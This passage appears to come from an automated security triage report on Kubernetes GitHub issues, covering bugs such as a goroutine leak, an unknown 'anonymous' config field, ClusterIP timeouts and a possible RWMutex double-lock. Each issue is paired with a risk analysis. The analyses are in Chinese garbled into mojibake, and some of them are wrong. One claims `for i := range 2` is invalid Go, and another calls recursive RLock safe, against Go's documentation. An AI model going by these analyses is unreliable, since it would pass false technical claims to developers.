#### OS version

ubuntu20.04


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†`kubernetes/test/utils/ktesting/signals.go`ä¸­çš„ä¸€ä¸ªå¯èƒ½çš„goroutineæ³„æ¼é—®é¢˜ã€‚é—®é¢˜å‘ç”Ÿåœ¨æµ‹è¯•ä»£ç ä¸­ï¼Œ`signalCtx`é€šè¿‡`context.WithCancel()`åˆ›å»ºï¼Œä½†æ˜¯æ²¡æœ‰è°ƒç”¨å¯¹åº”çš„`cancelFunc`ï¼Œå¯¼è‡´goroutineé˜»å¡ï¼Œæ— æ³•é‡Šæ”¾ã€‚æ­¤é—®é¢˜å¯ä»¥åœ¨æµ‹è¯•å‡½æ•°ä¸­é€šè¿‡`goleak`æ£€æµ‹åˆ°ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜å‘ç”Ÿåœ¨æµ‹è¯•ä»£ç ä¸­ï¼Œä¸æ¶‰åŠç”Ÿäº§ç¯å¢ƒï¼Œä¸ä¼šå¯¹ç³»ç»Ÿçš„å®‰å…¨æ€§äº§ç”Ÿå½±å“ã€‚å› æ­¤ï¼Œä¸å±äºå®‰å…¨é£é™©ã€‚

---

## Issue #127886 The Untyped Integer Error in ImageVolume  

- Issue é“¾æ¥ï¼š[#127886](https://github.com/kubernetes/kubernetes/issues/127886)

### Issue å†…å®¹

In **/test/e2e_node/image_volume.go**

The loop is having integer which is using range  to iterate. Whereas range is used to iterate Array and slices. 

Please take a look in the code snippet here.

```
for i := range 2 {
			volumePath := fmt.Sprintf("%s-%d", volumePathPrefix, i)
			ginkgo.By(fmt.Sprintf("Verifying the volume mount contents for path: %s", volumePath))

			firstFileContents := e2epod.ExecCommandInContainer(f, podName, containerName, "/bin/cat", filepath.Join(volumePath, "dir", "file"))
			gomega.Expect(firstFileContents).To(gomega.Equal("1"))

			secondFileContents := e2epod.ExecCommandInContainer(f, podName, containerName, "/bin/cat", filepath.Join(volumePath, "file"))
			gomega.Expect(secondFileContents).To(gomega.Equal("2"))
		}
```

Possible Solution:
Either we can use traditional way of `for loop`  **for <initialization;condition;increment/decrement>**.
Or we can use slice to iterate.

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡ºï¼Œåœ¨`/test/e2e_node/image_volume.go`æ–‡ä»¶ä¸­çš„ä¸€æ®µä»£ç ä½¿ç”¨äº†é”™è¯¯çš„`for`å¾ªç¯è¯­æ³•ï¼Œå³`for i := range 2`ã€‚åœ¨Goè¯­è¨€ä¸­ï¼Œ`range`å…³é”®å­—ç”¨äºéå†æ•°ç»„ã€åˆ‡ç‰‡ã€å­—ç¬¦ä¸²ã€æ˜ å°„å’Œé€šé“ï¼Œä¸èƒ½ç›´æ¥ç”¨äºæ•´æ•°ç±»å‹ã€‚å› æ­¤ï¼Œè¿™æ®µä»£ç ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯æˆ–è¿è¡Œæ—¶é”™è¯¯ã€‚

Issueæä¾›äº†å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼Œå»ºè®®ä½¿ç”¨ä¼ ç»Ÿçš„`for`å¾ªç¯ï¼Œæˆ–è€…å°†å¾ªç¯æ§åˆ¶å˜é‡æ›¿æ¢ä¸ºå¯è¿­ä»£çš„åˆ‡ç‰‡ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™å±äºä»£ç å®ç°é”™è¯¯æˆ–Bugï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚æ²¡æœ‰æ¶‰åŠåˆ°æ”»å‡»è€…å¯åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #127883 unknown field \"anonymous\""

- Issue é“¾æ¥ï¼š[#127883](https://github.com/kubernetes/kubernetes/issues/127883)

### Issue å†…å®¹

#### What happened?

```
apiVersion: apiserver.config.k8s.io/v1beta1
kind: AuthenticationConfiguration
anonymous:
  enabled: true
  conditions:
  - path: /api/v1/namespaces/kube-system/pods
```

--authentication-config=/etc/kubernetes/authentication-anonymous-config.yaml


```
// AuthenticationConfiguration provides versioned configuration for authentication.
type AuthenticationConfiguration struct {
	metav1.TypeMeta

	// jwt is a list of authenticator to authenticate Kubernetes users using
	// JWT compliant tokens. The authenticator will attempt to parse a raw ID token,
	// verify it's been signed by the configured issuer. The public key to verify the
	// signature is discovered from the issuer's public endpoint using OIDC discovery.
	// For an incoming token, each JWT authenticator will be attempted in
	// the order in which it is specified in this list.  Note however that
	// other authenticators may run before or after the JWT authenticators.
	// The specific position of JWT authenticators in relation to other
	// authenticators is neither defined nor stable across releases.  Since
	// each JWT authenticator must have a unique issuer URL, at most one
	// JWT authenticator will attempt to cryptographically validate the token.
	//
	// The minimum valid JWT payload must contain the following claims:
	// {
	//		"iss": "https://issuer.example.com",
	//		"aud": ["audience"],
	//		"exp": 1234567890,
	//		"<username claim>": "username"
	// }
	JWT []JWTAuthenticator `json:"jwt"`

	// If present --anonymous-auth must not be set
	Anonymous *AnonymousAuthConfig `json:"anonymous,omitempty"`
}
```

is anonymous new field

#### What did you expect to happen?

start up success

#### How can we reproduce it (as minimally and precisely as possible)?

apply the apiserver args

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.30.1

</details>


#### Cloud provider

<details>
vmware workstations
</details>


#### OS version

<details>

ubuntu2404
```


```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚é—®é¢˜æè¿°ä¸­ï¼Œç”¨æˆ·åœ¨é…ç½®Kubernetesçš„AuthenticationConfigurationæ—¶é‡åˆ°äº†â€œunknown field 'anonymous'â€çš„é”™è¯¯ï¼Œè¯´æ˜é…ç½®æ–‡ä»¶ä¸­çš„'anonymous'å­—æ®µæœªè¢«è¯†åˆ«ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºæ‰€ä½¿ç”¨çš„Kubernetesç‰ˆæœ¬ï¼ˆ1.30.1ï¼‰ä¸æ”¯æŒè¯¥å­—æ®µæˆ–é…ç½®æ ¼å¼æœ‰è¯¯ã€‚æ­¤é—®é¢˜å±äºç”¨æˆ·é…ç½®é”™è¯¯æˆ–ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜ï¼Œä¸å­˜åœ¨è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´é«˜å±æ¼æ´ã€‚

---

## Issue #127859 PVC with a non-empty selector canâ€™t have a PV dynamically provisioned

- Issue é“¾æ¥ï¼š[#127859](https://github.com/kubernetes/kubernetes/issues/127859)

### Issue å†…å®¹

#### What happened?

This issue is spun off from #57878 - I can't specify a label selector on a PVC without first provisioning the PV with labels; I want to use dynamic provisioning and apply labels to the PV from the PVC. As I read in the above issue, there might be problems with doing this via `selector` so I thought to open this to request a new field for setting PV metadata labels and annotations from the PVC.

#### What did you expect to happen?

I expected that in the 6 years since the previous issue was opened, this would be improved.

#### How can we reproduce it (as minimally and precisely as possible)?

Try to provision a volume with dynamic provisioning by applying a PVC with selector labels specified. It fails.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4
```

</details>

#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>
MacOS Sonoma 14.6.1

```console
Darwin WCG-MN64J410FL 23.6.0 Darwin Kernel Version 23.6.0: Mon Jul 29 21:13:04 PDT 2024; root:xnu-10063.141.2~1/RELEASE_ARM64_T6020 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨KubernetesåŠ¨æ€å­˜å‚¨å·ï¼ˆPVï¼‰åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œæ— æ³•é€šè¿‡åœ¨æŒä¹…åŒ–å­˜å‚¨å£°æ˜ï¼ˆPVCï¼‰ä¸­æŒ‡å®šé€‰æ‹©å™¨ï¼ˆselectorï¼‰æ¥ç»™PVè®¾ç½®æ ‡ç­¾ï¼ˆlabelsï¼‰çš„é—®é¢˜ã€‚Issueæäº¤è€…å¸Œæœ›èƒ½å¤Ÿåœ¨PVCä¸­æŒ‡å®šæ ‡ç­¾å’Œæ³¨è§£ï¼Œä»¥ä¾¿åœ¨åŠ¨æ€åˆ›å»ºPVæ—¶åº”ç”¨è¿™äº›å…ƒæ•°æ®ã€‚è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§éœ€æ±‚ï¼Œæ¶‰åŠåˆ°Kubernetesçš„å­˜å‚¨å·ç®¡ç†æœºåˆ¶ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¯¥Issueå¹¶æœªæ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚å®ƒæ²¡æœ‰æè¿°ä»»ä½•å¯èƒ½å¯¼è‡´æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127845 Is it normal to be unable to curl a Kubernetes service's ClusterIP from inside a pod?

- Issue é“¾æ¥ï¼š[#127845](https://github.com/kubernetes/kubernetes/issues/127845)

### Issue å†…å®¹

#### What happened?

**Hi everyone!** ğŸ‘‹

I'm running into an issue in my Kubernetes cluster where **I can't curl a service's ClusterIP from inside a pod**. The service itself is up and running â€” I can see it when I run kubectl get svc â€” but whenever I try to access it using curl, the request just times out.

I'm not sure if this is expected behavior or if there might be a misconfiguration somewhere in my cluster setup. ğŸ¤”

Here's some context:
The service is of type **ClusterIP**.

I can access the service by curling the pod's IP directly, but not through the service's ClusterIP. âŒ

DNS resolution works fine â€” nslookup returns the correct IP for the service. âœ…

There are no NetworkPolicies in place that would restrict traffic in the namespace. ğŸš«

Has anyone encountered something like this before? Any insights or advice would be greatly appreciated! ğŸ™

#### What did you expect to happen?

I expected that the curl requests to either the service name (hello-web.apps.svc.cluster.local) or the ClusterIP (10.103.60.54) would successfully reach the Nginx container running in the pod. ğŸ› ï¸ Since DNS resolves correctly and the service looks properly configured, I thought this would work smoothly.

However, the requests are timing out. ğŸ˜•
I'm not sure if it's a configuration issue on my side or if there's something missing in the Kubernetes network setup. 
Or... **could this even be the default behavior** and maybe it wasn't supposed to work this way in the first place? ğŸ¤·â€â™‚ï¸

---

#### How can we reproduce it (as minimally and precisely as possible)?

I ran the following **simple test** to try and understand the issue:

kubectl run curl-test --rm -i --tty --image=curlimages/curl -- /bin/sh                

If you don't see a command prompt, try pressing enter.
~ $ nslookup 10.103.60.54
Server:         10.96.0.10
Address:        10.96.0.10:53

54.60.103.10.in-addr.arpa       name = hello-web.apps.svc.cluster.local

~ $ **curl http://hello-web.apps.svc.cluster.local:80**
curl: (28) Failed to connect to hello-web.apps.svc.cluster.local port 80 after 135674 ms: Could not connect to server
~ $ curl http://10.103.60.54:80
curl: (28) Failed to connect to 10.103.60.54 port 80 after 132964 ms: Could not connect to server

---

#### Anything else we need to know?

**According to the official Kubernetes documentation**:
> Services
> A/AAAA records
> "Normal" (not headless) Services are assigned DNS A and/or AAAA records, depending on the IP family or families of the Service, with a name of the form my-svc.my-namespace.svc.cluster-domain.example. This resolves to the cluster IP of the Service.

Based on this, I understand that I should be able to use curl http://hello-web.apps.svc.cluster.local:80 to reach the service, as it resolves correctly in the DNS lookup.

However, both the DNS name and the ClusterIP return the same error when attempting to curl the service.

--- 
Here is the **service and deployment manifest** I'm using:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hello-web
  namespace: apps
  labels:
    app: hello-web
spec:
  selector:
    matchLabels:
      app: hello-web
  replicas: 1
  template:
    metadata:
      labels:
        app: hello-web
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: hello-web
  labels:
    run: hello-web
  namespace: apps
spec:
  ports:
  - port: 80
    protocol: TCP
  selector:
    app: hello-web

```
--- 

#### Kubernetes version

<details>

```console
kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
Hetzner vps
</details>


#### OS version

<details>

```console
PRETTY_NAME="Ubuntu 24.04.1 LTS"
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd - crictl version v1.31.1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CNI : flannel - v1.5.1-flannel2
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼ŒIssueä¸»è¦æè¿°äº†åœ¨Kubernetesé›†ç¾¤ä¸­ï¼Œä»ä¸€ä¸ªPodå†…éƒ¨æ— æ³•é€šè¿‡curlè®¿é—®å¦ä¸€ä¸ªServiceçš„ClusterIPåœ°å€çš„é—®é¢˜ã€‚ç”¨æˆ·æä¾›äº†è¯¦ç»†çš„æ’æŸ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬DNSè§£æã€Serviceå’ŒDeploymentçš„é…ç½®ç­‰ã€‚è¿™æ˜¯ä¸€ä¸ªå…³äºKubernetesç½‘ç»œé…ç½®å’ŒServiceè®¿é—®çš„é—®é¢˜ï¼Œå¹¶æœªæ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼ŒIssueæ²¡æœ‰æåˆ°ä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠé«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #127844 Something changed in 1.30 so Java application memory usage drastically changed behaviour?

- Issue é“¾æ¥ï¼š[#127844](https://github.com/kubernetes/kubernetes/issues/127844)

### Issue å†…å®¹

#### What happened?

The memory usage is observed with `container_memory_working_set_bytes`.

Before 1.30:

<img width="160" alt="image" src="https://github.com/user-attachments/assets/545fa558-f0a5-485c-af85-d54d3376a131">

After upgrading to 1.30:

<img width="223" alt="image" src="https://github.com/user-attachments/assets/280980cd-ec8a-45d6-83c5-0a5ba233e25b">

We haven't changed anything related to Kafka configuration in the meantime. Version used: `quay.io/strimzi/kafka:0.33.0-kafka-3.2.0`.

The problem with new behaviour is that sometimes we can get `NodeHasInsufficientMemory` which means more time for Kafka to recover.

The change in behaviour is present in other Java applications like Cassandra as well.

#### What did you expect to happen?

I'd expect memory to fill the cache and stay near the limit like before 1.30.

#### How can we reproduce it (as minimally and precisely as possible)?

One can run Kafka cluster in 1.29 and 1.30. Kafka will always fill all the memory it can (either up to memory limit or node memory limit).

You will see pattern of clearing cache memory in 1.30.

#### Anything else we need to know?

This is happening with multiple Kafka clusters. Some of those are running in cgroup v1 nodes, but some in cgroup v2. 

#### Kubernetes version

```
v1.30.5-gke.1014000
```

#### Cloud provider

```
1.30.5-gke.1014000
```

#### OS version

```console
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_METRICS_PRODUCT_ID=26
KERNEL_COMMIT_ID=395e8b40dd8bc3fe97fa563ffa370c25bd1da560
GOOGLE_CRASH_ID=Lakitu
VERSION=113
VERSION_ID=113
BUILD_ID=18244.151.27
```

$ uname -a
```
Linux 6.1.100+ #1 SMP PREEMPT_DYNAMIC Sat Aug 24 16:19:44 UTC 2024 x86_64 AMD EPYC 7B13 AuthenticAMD GNU/Linux
```

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
é€šè¿‡å¯¹è¯¥Issueçš„åˆ†æï¼Œå¯ä»¥çœ‹å‡ºé—®é¢˜é›†ä¸­åœ¨å‡çº§Kubernetesåˆ°1.30ç‰ˆæœ¬åï¼ŒJavaåº”ç”¨ç¨‹åºï¼ˆå¦‚Kafkaã€Cassandraï¼‰çš„å†…å­˜ä½¿ç”¨è¡Œä¸ºå‘ç”Ÿäº†å˜åŒ–ï¼Œå¯¼è‡´æœ‰æ—¶ä¼šå‡ºç°`NodeHasInsufficientMemory`çš„æƒ…å†µã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´Kafkaæ¢å¤æ—¶é—´å¢åŠ ã€‚

ä»å®‰å…¨é£é™©çš„è§’åº¦æ¥çœ‹ï¼Œè¯¥é—®é¢˜å¹¶æœªæ¶‰åŠæ”»å‡»è€…å¯åˆ©ç”¨çš„æ¼æ´æˆ–é£é™©ã€‚é—®é¢˜æ›´å¤šåœ°å±äºæ€§èƒ½æˆ–èµ„æºç®¡ç†æ–¹é¢çš„å˜åŒ–ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæœªæåŠæ”»å‡»è€…å¯åˆ©ç”¨çš„æ–¹å¼ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ²¡æœ‰è¿¹è±¡è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚
6. **å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127841 kubelet GetBootTime() could drift backward for 1s

- Issue é“¾æ¥ï¼š[#127841](https://github.com/kubernetes/kubernetes/issues/127841)

### Issue å†…å®¹

#### What happened?

There are a few places in kubelet that calls `pkg/kubelet/util`.`GetBootTime()`. One such place is the kubelet `/stats/summary` endpoint where it's getting the node startTime: [ref](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/stats/summary.go#L56)

And there's an issue in the [Linux implementation of `GetBootTime`](https://github.com/kubernetes/kubernetes/blob/v1.31.0/pkg/kubelet/util/boottime_util_linux.go#L30) that the result is not consistent: sometimes it could drift backwards for 1s. This caused problem in certain monitoring systems where the time series database expect timestamps to be monotonically increasing.****

#### What did you expect to happen?

`GetBootTime()` to return consistent result everytime it runs, more specifically the kubelet `/stats/summary` endpoint returns a consistent node startTime when kubelet restarts.

#### How can we reproduce it (as minimally and precisely as possible)?

do the following steps multiple times:

- restart kubelet
- do a http get on kubelet /stats/summary endpoint
- observe the `node`.`startTime` field in the response

you will see the node startTime could shift backwards for 1s in some cases.

You can also reproduce the issue by simply running the same `GetBootTime` logic multiple times:

```
cat get-boot-time.go 
package main

import (
	"fmt"
	"time"
	"golang.org/x/sys/unix"
)

func main() {
	// This is the same logic as `pkg/kubelet/util/boottime_util_linux.go`
	currentTime := time.Now()
	var info unix.Sysinfo_t
	if err := unix.Sysinfo(&info); err != nil {
		fmt.Errorf("error getting system uptime: %s", err)
		return
	}
	bootTime := currentTime.Add(-time.Duration(info.Uptime) * time.Second).Truncate(time.Second)
	fmt.Printf("bootTime: %s\n", bootTime)
	return
}

$ for i in {1..100} ; do go run get-boot-time.go ; done
bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:17 +0000 UTC    <--------- 1s backward drift
bootTime: 2024-09-09 01:04:18 +0000 UTC
 bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:18 +0000 UTC
```

#### Anything else we need to know?

I think the cause is a combination of multiple factors:

(a) `currentTime := time.Now()` is represented in a sub-second unit
(b) `unix.Sysinfo.Uptime` has a unit in second
(c) GetBootTime() subtracts uptime from current time and then round to the earlier second with the `time`.`Truncate()` method

so the following situation could happen:

1. system actually starts at 0,
2. when kubelet calls GetBootTime(), currentTIme returns 10s 999ms 999us 999ns
3. then 1us later, sysInfo reports Uptime 11s
4. at the end GetBootTime would round (10.999999 - 11) and return -1s instead of the actual 0s

#### One possible solution:

The drift always happen when Sysinfo.upTime increased by one second, so we could avoid it by: call the same GetBootTime() logic 3 times in a row, assuming each call finishes < 1s, then there will be for sure at least 2 times where Sysinfo.upTime agrees with each other. Then out of the 2 times, we use the GetBootTime() result from first one.

#### Kubernetes version

all existing kubernetes versions

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueæè¿°äº†kubeletçš„GetBootTime()å‡½æ•°åœ¨æŸäº›æƒ…å†µä¸‹ä¼šè¿”å›æ¯”å®é™…æ—¶é—´æ—©1ç§’çš„å¯åŠ¨æ—¶é—´ï¼Œå¯èƒ½å¯¼è‡´ç›‘æ§ç³»ç»Ÿä¸­çš„æ—¶é—´åºåˆ—æ•°æ®å‡ºç°é—®é¢˜ã€‚ç„¶è€Œï¼Œè¿™å±äºåŠŸèƒ½æ€§é”™è¯¯ï¼Œä¸æ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜ä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä¹Ÿä¸ä¼šäº§ç”Ÿé«˜å±æ¼æ´ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127837 1.30.5 binary : 404

- Issue é“¾æ¥ï¼š[#127837](https://github.com/kubernetes/kubernetes/issues/127837)

### Issue å†…å®¹

#### What happened?

404 https://storage.googleapis.com/kubernetes-release/release/v1.30.5/bin/linux/amd64/kubectl

#### What did you expect to happen?

200 ok

#### How can we reproduce it (as minimally and precisely as possible)?

wget https://storage.googleapis.com/kubernetes-release/release/v1.30.5/bin/linux/amd64/kubectl

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.30.5


#### Cloud provider

no

#### OS version

all

#### Install tools

kubectl

#### Container runtime (CRI) and version (if applicable)

all

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

all

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ç”¨æˆ·åœ¨å°è¯•ä¸‹è½½Kubernetes 1.30.5ç‰ˆæœ¬çš„kubectläºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œæ”¶åˆ°äº†404é”™è¯¯ã€‚ç”¨æˆ·æœŸæœ›è·å–200 OKçš„å“åº”ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºè¯¥ç‰ˆæœ¬çš„kubectläºŒè¿›åˆ¶æ–‡ä»¶å°šæœªå‘å¸ƒï¼Œæˆ–è€…ä¸‹è½½åœ°å€æœ‰è¯¯ã€‚è¿™æ˜¯ä¸€ä¸ªç‰ˆæœ¬å‘å¸ƒæˆ–ä¸‹è½½é“¾æ¥é—®é¢˜ï¼Œä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚

---

## Issue #127826 device manager: potential Double-Locking of Mutex

- Issue é“¾æ¥ï¼š[#127826](https://github.com/kubernetes/kubernetes/issues/127826)

### Issue å†…å®¹

#### What happened?

In the file [pod_devices.go](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L101), there is a potential issue of double-locking a mutex in the function `podDevices`.
- In line [102](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L102), the read lock (`pdev.RLock()`) is acquired in the `podDevices` function to ensure safe access to `pdev.devs`.
- Later, on line [107](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L107), `podDevices` calls [containerDevices](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L114), which also attempts to acquire the same read lock via another call to `pdev.RLock()` on line [115](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L115). This may result in double-locking the same mutex within the same thread.

Even though both `podDevices` and `containerDevices` only use read locks (`RLock()`), double-locking a mutex, even for reads, can lead to deadlocks, if there is another routine trying to acquire `Lock()` in between the `RLock()`s, according to the documentation of [RWMutex](https://pkg.go.dev/sync#RWMutex).

The standard `sync.Mutex()` in **Go** is not a recursive locking implementation while it is used recursively in the `podDevices` function. You can read more on why go does not implement recursive locking [here](https://groups.google.com/g/golang-nuts/c/XqW1qcuZgKg/m/Ui3nQkeLV80J).

#### What did you expect to happen?

The expectation is that a mutex should not be double-locked within the same thread. In this case, either the locking logic needs to be restructured to prevent multiple acquisitions of the same lock or `containerDevices` should not attempt to lock the mutex if it is already locked by `podDevices`.

#### How can we reproduce it (as minimally and precisely as possible)?

This issue is identified through static analysis, so it cannot be directly reproduced via runtime observation. However, if left unresolved, it could lead to unpredictable behavior in environments where recursive read locks are not supported.

#### Anything else we need to know?

Sponsorship and Support:

This work is done by the security researchers from OpenRefactory and is supported by the [Open Source Security Foundation (OpenSSF)](https://openssf.org/): [Project Alpha-Omega](https://alpha-omega.dev/). Alpha-Omega is a project partnering with open source software project maintainers to systematically find new, as-yet-undiscovered vulnerabilities in open source code - and get them fixed â€“ to improve global software supply chain security.

The bug is found by running the Intelligent Code Repair (iCR) tool by [OpenRefactory, Inc.](https://openrefactory.com/) and then manually triaging the results.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

*No response*

#### Install tools

*No response*

#### Container runtime (CRI) and version (if applicable)

*No response*

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

*No response*

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueè®¨è®ºäº†åœ¨Goè¯­è¨€ä¸­å¯èƒ½å­˜åœ¨çš„åŒé‡è¯»å–é”å®šï¼ˆRLockï¼‰çš„é—®é¢˜ã€‚æ ¹æ®Goè¯­è¨€å®˜æ–¹æ–‡æ¡£ï¼Œsync.RWMutexå…è®¸åŒä¸€åç¨‹å¤šæ¬¡è·å–è¯»å–é”ï¼ˆRLockï¼‰ï¼Œè¿™æ˜¯å®‰å…¨çš„ï¼Œä¸ä¼šå¯¼è‡´æ­»é”æˆ–å…¶ä»–é—®é¢˜ã€‚å› æ­¤ï¼ŒIssueä¸­æåˆ°çš„åŒé‡è·å–è¯»å–é”å®šåœ¨å®é™…ä¸­å¹¶ä¸æ„æˆå®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #127813 Deployment with multiple port mappings with same port number but different protocol fails to update properly

- Issue é“¾æ¥ï¼š[#127813](https://github.com/kubernetes/kubernetes/issues/127813)

### Issue å†…å®¹

#### What happened?

